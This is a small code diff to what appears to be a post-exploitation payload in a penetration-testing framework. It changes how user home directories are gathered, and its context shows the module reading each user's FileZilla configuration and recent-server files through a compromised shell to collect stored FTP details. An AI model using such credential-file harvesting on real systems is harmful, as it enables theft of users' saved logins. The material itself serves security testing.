@@ -38,7 +38,8 @@ class ftp_config_files(base_payload):
             if content:
                 result.update({file:content})
 
-        users_name = self.exec_payload('users').values()
+        # TODO: Should I move this to users_config_files ?
+        users_name = self.exec_payload('users')
         for user_home in users_name:
             filezilla_content = self.shell.read(user_home+'.filezilla/filezilla.xml')
             recent_content = self.shell.read(user_home+'.filezilla/recentservers.xml')
